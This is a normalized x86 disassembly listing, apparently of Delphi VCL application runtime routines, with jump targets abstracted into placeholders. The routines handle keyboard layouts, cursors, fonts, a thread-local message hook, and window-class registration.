mov eax 0xc
call sub_4026cc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_451060
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45120b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451212
lea eax [ ebp - 0x260 ]
call sub_403eac
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403eac
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_4157f4
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_4088c0
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_43ed44
test al al
je r-xdata
xor eax eax
push ebp
push sub_4511c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_40411c
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_40411c
sub_45127c
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_453adc
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_453890
mov dl 0x1
mov eax [ rw-data ]
call sub_453890
sub_4512e8
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_451310
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_4512e8
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_4067cc
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406754
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4513a0
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4514e5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_453890
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41cd14
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41cd14
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_41cdf8
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41cd14
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_41cd14
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41cd14
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_453890
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_41cb58
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_41cb58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4514ec
cmp [ rw-data ] 0x0
je r-xdata
sub_451524
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_451584
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_4516c0 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_451734
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_450e8c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_413860
mov dl [ ebp - 0x1 ]
call sub_451584
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_450e78
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_413704
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_4138dc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_413860
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_451524
test al al
je r-xdata
inc esi
sub_451880
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_450e8c
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_450e78
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_4518d8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_451880
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_451952
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_451734
pop ecx
push ebp
mov al 0x2
call sub_451734
pop ecx
push ebp
mov al 0x3
call sub_451734
pop ecx
push ebp
mov al 0x4
call sub_451734
pop ecx
push ebp
mov al 0x5
call sub_451734
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4030f0
retn
sub_451960
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4514f4
xor eax eax
push ebp
push sub_4519d9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4518d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_4514fc
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4519f4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403eac
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403f00
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_451a4c
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_403578#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_453e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_451aa0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_4321e8
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_453f14
sub_451afc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_452fb4
sub_451b40
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_451afc
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_451aa0
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_451bb4
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_451c10
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_451c40
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_451c68
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_451c10
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_451c40
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_451c40
sub_451ca8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419b0c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_453380
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_421a64
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_421e34
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_453b18
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40bf70
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_453578
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40bf98
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_4082a0
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_40411c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_453cf4
mov eax ebx
call sub_454708
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_451fb0
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_451e91
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_403464
mov ebx edx
mov esi eax
mov eax esi
call sub_454718
mov [ esp + 0x4 ] esi
mov [ esp ] sub_453380
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_453578
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_453f14
xor edx edx
mov eax esi
call sub_453890
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419b58
push esi
push sub_4523e4
mov eax esi
call sub_45316c
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4054e8
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_4030f0
mov eax [ esi + 0x90 ]
call sub_4030f0
mov eax [ esi + 0x98 ]
call sub_4030f0
test bl bl
jle r-xdata
call sub_41ac34
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_451fb0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_452151
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452158
lea eax [ ebp - 0x2c ]
call sub_403eac
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_452530
call sub_41ab9c
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_40436c
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406854
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403eac
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_452c34
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_452c34
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_452160
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_450e94
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_4521c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_413704
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_43a170
cmp ebx eax
je r-xdata
sub_452230
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
